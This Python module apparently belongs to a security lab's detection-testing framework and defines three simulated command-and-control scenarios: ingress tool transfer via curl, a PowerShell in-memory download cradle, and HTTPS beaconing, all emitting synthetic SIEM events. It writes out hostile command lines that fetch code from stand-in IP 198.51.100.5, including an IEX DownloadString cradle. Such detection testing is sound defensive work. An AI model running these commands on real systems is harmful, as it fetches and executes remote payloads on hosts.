"""Command and Control (C2) Attack Simulation Scenarios."""

import time
from datetime import datetime, timezone
from typing import List
from src.detection.models import MitreAttackInfo, MitreTactic
from src.siem.models import (
    ECSEvent,
    EndpointInfo,
    EventCategory,
    EventMetadata,
    EventOutcome,
    EventSeverity,
    HostInfo,
    ProcessInfo,
    UserInfo,
)
from src.simulation.models import (
    BaseScenario,
    ScenarioExecutionStatus,
    ScenarioResult,
    SimulationContext,
)
from src.simulation.safety import LabSafetyGuardrail


class IngressToolTransferScenario(BaseScenario):
    """Simulates downloading offensive tools/backdoors to /tmp via curl/wget."""

    id: str = "SCN-C2-001"
    name: str = "Ingress Tool Transfer via Remote File Download"
    description: str = (
        "Simulates an adversary transferring offensive Python utilities into /tmp "
        "from an external staging server."
    )
    mitre_attack: MitreAttackInfo = MitreAttackInfo(
        tactic=MitreTactic.COMMAND_AND_CONTROL,
        technique_id="T1105",
        technique_name="Ingress Tool Transfer",
        url="https://attack.mitre.org/techniques/T1105/",
    )
    preconditions: List[str] = ["Linux Server Service operational"]
    lab_target: str = "srv01.corp.enterprise.local (172.28.20.15)"
    simulated_behavior: str = (
        "Execute command: curl -o /tmp/impacket_tools.py http://198.51.100.5/tools.py"
    )
    expected_telemetry: List[str] = [
        "linux.auditd EXECVE",
        "command_line contains curl -o /tmp/",
    ]
    expected_detections: List[str] = ["DET-C2-001"]
    expected_alerts: List[str] = [
        "Ingress Tool Transfer and Remote Payload Download Detected",
    ]
    cleanup_requirements: List[str] = [
        "Delete staged /tmp/impacket_tools.py file",
    ]
    is_benign: bool = False

    def execute(self, context: SimulationContext) -> ScenarioResult:
        LabSafetyGuardrail.assert_safe_target("srv01.corp.enterprise.local")
        start = time.time()
        start_time = datetime.now(timezone.utc)
        logs = []
        events_generated = []

        if context.dry_run:
            logs.append("[DRY RUN] Would execute tool transfer on srv01")
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.SKIPPED,
                start_time=start_time,
                end_time=datetime.now(timezone.utc),
                duration_ms=(time.time() - start) * 1000,
                execution_logs=logs,
            )

        if not context.linux_service:
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.FAILED,
                error_message="SimulationContext missing linux_service handle",
            )

        cmd = "curl -o /tmp/impacket_tools.py http://198.51.100.5/tools.py"
        logs.append(f"Simulating tool transfer: {cmd}")
        res = context.linux_service.simulate_command_execution(
            user="sysadmin",
            command_line=cmd,
            pid=25100,
        )
        logs.append(f"Audit log generated: {res}")

        if context.event_store:
            recent = context.event_store.query_events()
            events_generated = [
                e.to_dict()
                for e in recent
                if e.process and "/tmp/impacket" in (e.process.command_line or "")
            ]

        return ScenarioResult(
            scenario_id=self.id,
            scenario_name=self.name,
            status=ScenarioExecutionStatus.SUCCESS,
            start_time=start_time,
            end_time=datetime.now(timezone.utc),
            duration_ms=(time.time() - start) * 1000,
            generated_events_count=len(events_generated),
            generated_events=events_generated,
            execution_logs=logs,
        )


class PowerShellDownloadCradleScenario(BaseScenario):
    """Simulates in-memory PowerShell script download and execution via WebClient download cradle."""

    id: str = "SCN-C2-002"
    name: str = "PowerShell Remote In-Memory Download Cradle"
    description: str = (
        "Simulates an adversary executing a fileless PowerShell download cradle pulling code "
        "directly into memory via Net.WebClient and IEX."
    )
    mitre_attack: MitreAttackInfo = MitreAttackInfo(
        tactic=MitreTactic.COMMAND_AND_CONTROL,
        technique_id="T1105",
        technique_name="Ingress Tool Transfer",
        subtechnique_id="T1059.001",
        subtechnique_name="PowerShell",
        url="https://attack.mitre.org/techniques/T1105/",
    )
    preconditions: List[str] = ["SIEM Collector operational"]
    lab_target: str = "wkstn01.corp.enterprise.local (172.28.20.50)"
    simulated_behavior: str = (
        "Emit PowerShell Event for: powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/cradle.ps1')\""
    )
    expected_telemetry: List[str] = [
        "dataset: windows.powershell",
        "command_line contains DownloadString and IEX",
    ]
    expected_detections: List[str] = ["DET-PS-002"]
    expected_alerts: List[str] = [
        "PowerShell Remote Download Cradle Detected",
    ]
    cleanup_requirements: List[str] = ["Stateless event emission"]
    is_benign: bool = False

    def execute(self, context: SimulationContext) -> ScenarioResult:
        LabSafetyGuardrail.assert_safe_target("wkstn01.corp.enterprise.local")
        start = time.time()
        start_time = datetime.now(timezone.utc)
        logs = []
        events_generated = []

        if context.dry_run:
            logs.append("[DRY RUN] Would emit PowerShell download cradle event")
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.SKIPPED,
                start_time=start_time,
                end_time=datetime.now(timezone.utc),
                duration_ms=(time.time() - start) * 1000,
                execution_logs=logs,
            )

        if not context.siem_collector:
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.FAILED,
                error_message="SimulationContext missing siem_collector handle",
            )

        cmd = "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.5/cradle.ps1')\""
        event = ECSEvent(
            timestamp=datetime.now(timezone.utc),
            event=EventMetadata(
                category=EventCategory.PROCESS,
                action="windows.process.created",
                outcome=EventOutcome.SUCCESS,
                severity=EventSeverity.HIGH,
                dataset="windows.powershell",
            ),
            host=HostInfo(name="wkstn01.corp.enterprise.local", ip="172.28.20.50"),
            user=UserInfo(name="attacker", domain="CORP"),
            process=ProcessInfo(
                name="powershell.exe",
                pid=9520,
                command_line=cmd,
            ),
            message=f"PowerShell cradle execution: {cmd}",
        )
        context.siem_collector.ingest_event(event)
        events_generated.append(event.to_dict())
        logs.append("Emitted PowerShell download cradle event to SIEM.")

        return ScenarioResult(
            scenario_id=self.id,
            scenario_name=self.name,
            status=ScenarioExecutionStatus.SUCCESS,
            start_time=start_time,
            end_time=datetime.now(timezone.utc),
            duration_ms=(time.time() - start) * 1000,
            generated_events_count=len(events_generated),
            generated_events=events_generated,
            execution_logs=logs,
        )


class C2BeaconingScenario(BaseScenario):
    """Simulates periodic outbound Command and Control (C2) beaconing."""

    id: str = "SCN-C2-003"
    name: str = "Encrypted C2 Beaconing Communication"
    description: str = (
        "Simulates periodic HTTPS beaconing from a compromised enterprise server to an external adversary C2 server."
    )
    mitre_attack: MitreAttackInfo = MitreAttackInfo(
        tactic=MitreTactic.COMMAND_AND_CONTROL,
        technique_id="T1071",
        technique_name="Application Layer Protocol",
        subtechnique_id="T1071.001",
        subtechnique_name="Web Protocols",
        url="https://attack.mitre.org/techniques/T1071/001/",
    )
    preconditions: List[str] = ["SIEM Collector operational"]
    lab_target: str = "srv01.corp.enterprise.local (172.28.20.15)"
    simulated_behavior: str = (
        "Emit Network Traffic Event for outbound C2 beacon to 198.51.100.20:443"
    )
    expected_telemetry: List[str] = [
        "category: network",
        "action: c2_beacon",
        "destination.ip: 198.51.100.20",
    ]
    expected_detections: List[str] = ["DET-C2-002"]
    expected_alerts: List[str] = [
        "Command & Control (C2) Communication Detected",
    ]
    cleanup_requirements: List[str] = ["Stateless network event emission"]
    is_benign: bool = False

    def execute(self, context: SimulationContext) -> ScenarioResult:
        LabSafetyGuardrail.assert_safe_target("198.51.100.20")
        start = time.time()
        start_time = datetime.now(timezone.utc)
        logs = []
        events_generated = []

        if context.dry_run:
            logs.append("[DRY RUN] Would emit C2 beaconing event")
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.SKIPPED,
                start_time=start_time,
                end_time=datetime.now(timezone.utc),
                duration_ms=(time.time() - start) * 1000,
                execution_logs=logs,
            )

        if not context.siem_collector:
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.FAILED,
                error_message="SimulationContext missing siem_collector handle",
            )

        event = ECSEvent(
            timestamp=datetime.now(timezone.utc),
            event=EventMetadata(
                category=EventCategory.NETWORK,
                action="c2_beacon",
                outcome=EventOutcome.SUCCESS,
                severity=EventSeverity.HIGH,
                dataset="network.flow",
            ),
            host=HostInfo(name="srv01.corp.enterprise.local", ip="172.28.20.15"),
            source=EndpointInfo(ip="172.28.20.15", port=51234),
            destination=EndpointInfo(ip="198.51.100.20", port=443),
            message="Periodic C2 beacon connection established to 198.51.100.20:443",
            custom={"is_c2_traffic": True, "c2_type": "c2_beacon"},
        )
        context.siem_collector.ingest_event(event)
        events_generated.append(event.to_dict())
        logs.append("Emitted C2 beaconing event to SIEM.")

        return ScenarioResult(
            scenario_id=self.id,
            scenario_name=self.name,
            status=ScenarioExecutionStatus.SUCCESS,
            start_time=start_time,
            end_time=datetime.now(timezone.utc),
            duration_ms=(time.time() - start) * 1000,
            generated_events_count=len(events_generated),
            generated_events=events_generated,
            execution_logs=logs,
        )
